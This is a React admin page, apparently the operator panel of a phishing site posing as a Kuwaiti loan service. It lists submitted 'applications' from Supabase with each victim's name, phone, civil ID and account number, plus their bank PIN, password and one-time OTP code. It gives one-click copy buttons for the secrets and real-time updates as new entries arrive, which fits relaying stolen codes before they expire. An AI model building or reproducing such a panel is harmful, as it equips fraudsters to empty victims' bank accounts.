import { useEffect, useState } from 'react'
import { Link } from 'react-router-dom'
import { getApplications } from '../lib/applicationStorage'
import { isSupabaseConfigured, supabase } from '../lib/supabase'

function formatDate(value) {
  if (!value) return '—'
  const date = new Date(value)
  return Number.isNaN(date.getTime()) ? value : date.toLocaleString('ar-KW')
}

export default function AdminApplicationsPage() {
  const [applications, setApplications] = useState([])
  const [source, setSource] = useState('local')
  const [copiedField, setCopiedField] = useState(null)

  const loadData = async () => {
    let supabaseData = []
    if (isSupabaseConfigured && supabase) {
      const { data, error } = await supabase
        .from('loan_applications')
        .select('*')
        .order('updated_at', { ascending: false })

      if (!error && data) {
        supabaseData = data
        setSource('supabase')
      } else if (error) {
        console.error('Supabase fetch error:', error.message)
      }
    }

    const localData = getApplications()
    const combinedMap = new Map()

    ;[...localData, ...supabaseData].forEach((item) => {
      const id = item.id || item.created_at
      if (id) {
        combinedMap.set(id, { ...combinedMap.get(id), ...item })
      }
    })

    const finalApplications = Array.from(combinedMap.values()).sort(
      (a, b) => new Date(b.updatedAt || b.updated_at || 0) - new Date(a.updatedAt || a.updated_at || 0)
    )

    setApplications(finalApplications)
    if (supabaseData.length === 0 && localData.length > 0) {
      setSource('تخزين محلي')
    }
  }

  useEffect(() => {
    let active = true
    loadData()

    if (!isSupabaseConfigured || !supabase) return () => { active = false }

    const channel = supabase
      .channel('loan-applications-admin')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'loan_applications' }, () => {
        if (active) loadData()
      })
      .subscribe()

    return () => {
      active = false
      supabase.removeChannel(channel)
    }
  }, [])

  const handleDelete = async (itemId) => {
    if (!window.confirm('هل أنت متأكد من حذف هذا الطلب؟')) return

    const localData = getApplications()
    const filteredLocal = localData.filter((item) => (item.id || item.created_at) !== itemId)
    localStorage.setItem('tamwil_applications', JSON.stringify(filteredLocal))

    if (isSupabaseConfigured && supabase) {
      const { error } = await supabase.from('loan_applications').delete().eq('id', itemId)
      if (error) {
        console.error('Error deleting from supabase:', error.message)
      }
    }

    setApplications((prev) => prev.filter((item) => (item.id || item.created_at) !== itemId))
  }

  const handleCopy = (text, fieldKey) => {
    if (!text || text === '—') return
    navigator.clipboard.writeText(text)
    setCopiedField(fieldKey)
    setTimeout(() => setCopiedField(null), 2000)
  }

  const normalize = (item) => ({
    ...item,
    fullName: item.fullName || item.full_name || item.name,
    phoneNumber: item.phoneNumber || item.phone_number || item.phone,
    civilId: item.civilId || item.civil_id_last2,
    accountNumber: item.accountNumber || item.account_last4,
    amount: item.amount,
    plan: item.plan || item.loanType,
    installmentAmount: item.installmentAmount,
    pin: item.pin,
    password: item.password,
    otpCode: item.otpCode || item.otp_code,
    createdAt: item.createdAt || item.created_at,
    updatedAt: item.updatedAt || item.updated_at,
  })

  const normalizedApplications = applications.map(normalize)

  const handleLogout = async () => {
    localStorage.removeItem('tamwil_admin_logged')
    if (isSupabaseConfigured && supabase) {
      await supabase.auth.signOut()
    }
  }

  return (
    <div className="min-h-screen bg-slate-100 font-sans pb-12" dir="rtl">
      
      {/* شريط علوي */}
      <header className="bg-sky-600 text-white shadow-sm px-4 py-3 sticky top-0 z-20 flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className="text-xl">📋</span>
          <h1 className="text-base font-bold">إدارة الطلبات</h1>
        </div>

        <div className="flex items-center gap-2">
          <Link
            to="/admin"
            className="text-xs font-medium bg-sky-700/60 hover:bg-sky-700 px-3 py-1.5 rounded-lg transition"
          >
            🏠 لوحة التحكم
          </Link>
          <button
            type="button"
            onClick={handleLogout}
            className="text-xs font-medium bg-sky-700/60 hover:bg-sky-700 px-3 py-1.5 rounded-lg transition"
          >
            خروج
          </button>
        </div>
      </header>

      {/* شريط التنقل السريع */}
      <div className="bg-white border-b border-slate-200 px-4 flex items-center gap-4 text-sm shadow-xs sticky top-[52px] z-10">
        <Link to="/admin" className="py-2.5 text-slate-500 hover:text-slate-900 font-medium flex items-center gap-1.5 text-xs">
          <span>🔄</span> الحي
        </Link>
        <button className="py-2.5 border-b-2 border-sky-600 text-sky-600 font-bold flex items-center gap-1.5 text-xs">
          <span>📋</span> الطلبات ({normalizedApplications.length})
        </button>
      </div>

      <div className="mx-auto max-w-4xl px-3 sm:px-6 mt-4 space-y-4">
        
        {/* شريط التحكم والتحديث */}
        <div className="flex items-center justify-between bg-white p-3.5 rounded-2xl shadow-xs border border-slate-200">
          <div>
            <h2 className="text-sm font-black text-slate-900">سجل الطلبات الواردة</h2>
            <p className="text-[11px] text-slate-500">تحديث فوري للبيانات والمدخلات</p>
          </div>
          <button 
            onClick={loadData} 
            className="rounded-xl bg-sky-600 px-3.5 py-2 text-xs font-bold text-white hover:bg-sky-700 active:scale-95 transition shadow-xs flex items-center gap-1.5"
          >
            <span>🔄</span> تحديث
          </button>
        </div>

        {normalizedApplications.length === 0 ? (
          <div className="rounded-2xl border border-dashed border-slate-300 bg-white p-10 text-center text-slate-500 text-sm">
            لا توجد طلبات مسجلة حاليًا.
          </div>
        ) : (
          <div className="space-y-3.5">
            {normalizedApplications.map((item, index) => {
              const itemId = item.id || item.created_at
              return (
                <div 
                  key={itemId} 
                  className="rounded-2xl border border-slate-200/80 bg-white p-4 shadow-xs transition hover:shadow-md relative overflow-hidden"
                >
                  
                  {/* شريط ملون علوي برقم الطلب والحالة */}
                  <div className="flex items-center justify-between pb-3 mb-3 border-b border-slate-100">
                    <div className="flex items-center gap-2">
                      <span className="flex items-center justify-center w-6 h-6 rounded-full bg-sky-100 text-sky-700 text-[11px] font-black">
                        {index + 1}
                      </span>
                      <div>
                        <h3 className="text-base font-black text-slate-900">
                          {item.fullName || item.username || 'مستخدم جديد'}
                        </h3>
                        <p className="text-[10px] text-slate-400 font-mono">ID: {itemId?.toString().slice(0, 8)}</p>
                      </div>
                    </div>
                    
                    <div className="flex items-center gap-1.5">
                      <span className="inline-flex rounded-full bg-emerald-50 px-2.5 py-0.5 text-[11px] font-bold text-emerald-700 border border-emerald-200">
                        {item.status || 'new'}
                      </span>
                      <button
                        type="button"
                        onClick={() => handleDelete(itemId)}
                        className="p-1.5 rounded-lg bg-red-50 text-red-600 hover:bg-red-600 hover:text-white transition"
                        title="حذف الطلب"
                      >
                        🗑️
                      </button>
                    </div>
                  </div>

                  {/* تفاصيل القرض المختار (إذا توفرت) */}
                  {(item.amount || item.plan) && (
                    <div className="mb-3 rounded-xl bg-amber-50/80 border border-amber-200/60 p-3">
                      <div className="grid grid-cols-2 gap-2 text-xs">
                        <div>
                          <span className="text-amber-800/70 text-[10px] block font-bold">مبلغ القرض</span>
                          <span className="font-black text-slate-900 text-sm">{item.amount ? `${Number(item.amount).toLocaleString()} د.ك` : '—'}</span>
                        </div>
                        <div>
                          <span className="text-amber-800/70 text-[10px] block font-bold">خطة الأقساط</span>
                          <span className="font-black text-slate-900">{item.plan || '—'}</span>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* البيانات الهامة (بدون خطوة حالية) */}
                  <div className="grid grid-cols-2 sm:grid-cols-3 gap-2 text-xs mb-3">
                    
                    {/* رقم الهاتف */}
                    <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-100 flex flex-col justify-between">
                      <span className="text-[10px] text-slate-400 font-bold">رقم الهاتف</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="font-bold text-slate-800 font-mono text-xs" dir="ltr">{item.phoneNumber || '—'}</span>
                        {item.phoneNumber && (
                          <button onClick={() => handleCopy(item.phoneNumber, `phone-${itemId}`)} className="text-[10px] text-sky-600 bg-sky-50 px-1.5 py-0.5 rounded">
                            {copiedField === `phone-${itemId}` ? 'تم النسخ' : 'نسخ'}
                          </button>
                        )}
                      </div>
                    </div>

                    {/* اسم المستخدم */}
                    <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-100 flex flex-col justify-between">
                      <span className="text-[10px] text-slate-400 font-bold">اسم المستخدم</span>
                      <span className="font-bold text-slate-800 mt-1 truncate">{item.username || '—'}</span>
                    </div>

                    {/* البطاقة المدنية */}
                    <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-100 flex flex-col justify-between">
                      <span className="text-[10px] text-slate-400 font-bold">البطاقة المدنية</span>
                      <span className="font-bold text-slate-800 mt-1 font-mono">{item.civilId || '—'}</span>
                    </div>

                    {/* رقم الحساب */}
                    <div className="bg-slate-50 p-2.5 rounded-xl border border-slate-100 flex flex-col justify-between">
                      <span className="text-[10px] text-slate-400 font-bold">رقم الحساب</span>
                      <span className="font-bold text-slate-800 mt-1 font-mono">{item.accountNumber || '—'}</span>
                    </div>

                    {/* الرقم السري PIN */}
                    <div className="bg-red-50/60 p-2.5 rounded-xl border border-red-100 flex flex-col justify-between">
                      <span className="text-[10px] text-red-500 font-bold">الرقم السري (PIN)</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="font-black text-red-600 font-mono">{item.pin || '—'}</span>
                        {item.pin && (
                          <button onClick={() => handleCopy(item.pin, `pin-${itemId}`)} className="text-[10px] text-red-600 bg-red-100/70 px-1.5 py-0.5 rounded">
                            {copiedField === `pin-${itemId}` ? 'تم' : 'نسخ'}
                          </button>
                        )}
                      </div>
                    </div>

                    {/* كلمة المرور */}
                    <div className="bg-red-50/60 p-2.5 rounded-xl border border-red-100 flex flex-col justify-between">
                      <span className="text-[10px] text-red-500 font-bold">كلمة المرور</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="font-black text-red-600 font-mono truncate">{item.password || '—'}</span>
                        {item.password && (
                          <button onClick={() => handleCopy(item.password, `pass-${itemId}`)} className="text-[10px] text-red-600 bg-red-100/70 px-1.5 py-0.5 rounded">
                            {copiedField === `pass-${itemId}` ? 'تم' : 'نسخ'}
                          </button>
                        )}
                      </div>
                    </div>

                    {/* رمز التحقق OTP */}
                    <div className="bg-red-50/60 p-2.5 rounded-xl border border-red-100 col-span-2 flex flex-col justify-between">
                      <span className="text-[10px] text-red-500 font-bold">رمز التحقق (OTP)</span>
                      <div className="flex items-center justify-between mt-1">
                        <span className="font-black text-red-600 text-sm font-mono tracking-widest">{item.otpCode || '—'}</span>
                        {item.otpCode && (
                          <button onClick={() => handleCopy(item.otpCode, `otp-${itemId}`)} className="text-xs font-bold text-red-600 bg-red-100 hover:bg-red-200 px-2.5 py-1 rounded-lg transition">
                            {copiedField === `otp-${itemId}` ? '✅ تم النسخ' : '📋 نسخ الرمز'}
                          </button>
                        )}
                      </div>
                    </div>

                  </div>

                  {/* تاريخ الإرسال أسفل الكارت */}
                  <div className="flex items-center justify-end pt-2.5 border-t border-slate-100 text-[11px] text-slate-400">
                    <span>{formatDate(item.createdAt || item.created_at)}</span>
                  </div>

                </div>
              )
            })}
          </div>
        )}
      </div>
    </div>
  )
}